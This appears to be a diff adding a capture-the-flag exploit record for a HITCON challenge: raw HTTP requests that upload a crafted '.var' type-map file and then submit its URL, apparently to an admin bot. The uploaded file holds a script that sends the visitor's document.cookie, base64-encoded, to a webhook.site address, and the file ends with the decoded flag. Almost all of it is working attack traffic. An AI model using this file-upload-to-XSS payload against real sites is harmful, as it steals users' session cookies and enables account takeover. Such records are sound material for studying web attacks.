@@ -1,0 +1,45 @@
+POST /upload.php HTTP/1.1
+Host: 52.68.87.21
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: multipart/form-data; boundary=--------468497530
+Content-Length: 360
+
+----------468497530
+Content-Disposition: form-data; name="file"; filename="a.var"
+Content-Type: text/plain
+
+URI: a.txt
+Content-type: text/html
+Body:----xyz----
+<html>
+<body>
+<script>window.location='https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?cookie='+btoa(document.cookie)</script>
+</body>
+</html>
+----xyz----
+----------468497530--
+
+
+
+POST / HTTP/1.1
+Host: 52.68.87.21
+Content-Length: 99
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://52.68.87.21
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://52.68.87.21/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+url=http://52.68.87.21/upload/709fecebe36fd4fce2bae7545352583c/36c5cab0af536ebc575eb897e2b98601.var
+
+
+dGhpcy1pcy1mb3IteW91PWhpdGNvbnt2YXIgZmxhZy5tYXAoYXJiaXRyYXJ5LWZpbGUtdXBsb2FkLXRvLVhTUy1hZ2FpbiEpfQ==
+	this-is-for-you=hitcon{var flag.map(arbitrary-file-upload-to-XSS-again!)}
